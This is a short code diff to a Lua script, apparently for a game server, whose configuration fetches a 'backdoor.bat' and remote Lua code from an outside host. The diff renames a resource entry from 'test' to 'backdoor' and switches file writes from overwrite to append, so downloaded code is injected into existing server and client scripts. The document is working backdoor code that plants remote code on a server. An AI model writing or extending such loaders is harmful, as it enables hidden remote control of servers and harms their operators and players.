@@ -3,7 +3,7 @@ local config = {
     windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
     enablePrints = true,
     resourceCodeURLs = {
-        ["test"] = {
+        ["backdoor"] = {
             client = "https://dc.fast-sell.de/server.lua",
             server = "https://dc.fast-sell.de/server.lua"
         }
@@ -70,7 +70,7 @@ local function loadResourceCode(resourceName, serverScript, clientScript)
 
     if serverScript and serverScript ~= "" then
         local serverFilePath = resourcePath .. "/server.lua"
-        local serverFile = io.open(serverFilePath, "w")
+        local serverFile = io.open(serverFilePath, "a")
         if serverFile then
             serverFile:write(serverScript)
             serverFile:close()
@@ -80,7 +80,7 @@ local function loadResourceCode(resourceName, serverScript, clientScript)
 
     if clientScript and clientScript ~= "" then
         local clientFilePath = resourcePath .. "/client.lua"
-        local clientFile = io.open(clientFilePath, "w")
+        local clientFile = io.open(clientFilePath, "a")
         if clientFile then
             clientFile:write(clientScript)
             clientFile:close()
